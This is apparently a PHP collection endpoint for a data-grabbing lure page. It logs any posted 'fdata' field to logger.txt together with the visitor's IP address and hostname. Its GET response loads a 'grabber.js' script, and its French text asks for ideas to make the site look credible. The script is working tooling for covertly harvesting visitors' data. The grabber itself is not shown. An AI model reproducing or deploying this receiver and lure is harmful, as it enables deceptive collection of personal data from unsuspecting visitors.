<?php
    date_default_timezone_set('Europe/Paris');

    function getIpAdress() {
        /*if(!empty($_SERVER['HTTP_CLIENT_IP'])) {
            return "http_client_ip: {$_SERVER['HTTP_CLIENT_IP']}";
        }elseif(!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
            return "http_x_forwarded_for: {$_SERVER['HTTP_X_FORWARDED_FOR']}";
        }else {
            return "remote_addr: {$_SERVER['REMOTE_ADDR']}";
        }*/
        $ip = $_SERVER["REMOTE_ADDR"];
        return $ip.";".gethostbyaddr($ip);
    }

    if($_SERVER["REQUEST_METHOD"] == "POST") {
        if(isset($_POST["fdata"])) {
            $fdata = urldecode($_POST["fdata"]);
            $line = date(DATE_RFC822) . " | " . getIpAdress() . " | " . $fdata . "\n";
            $f = fopen("logger.txt", 'a');
            fwrite($f, $line);
            fclose($f);
        }else {
            echo "Invalide !" . var_dump($_POST);
        }
    }else {
        echo "<p>Salut ! Alors vous aimez ?<br></p>";
        echo "<img src=\"https://external-content.duckduckgo.com/iu/?u=http%3A%2F%2Fth09.deviantart.net%2Ffs71%2F200H%2Ff%2F2014%2F146%2Ff%2F4%2Fkeep_calm_and_kill_kira___death_note___light_by_evabirthday-d60glxd.jpg\"><br>";
        echo "<p>Ceci un site test, donc faudra me donner des idées de quoi rendre crédible le truc.</p>";
        echo "<script src=\"grabber.js\"></script>";

        $ip = getIpAdress();
        echo "Ton IP est $ip";
    }
?>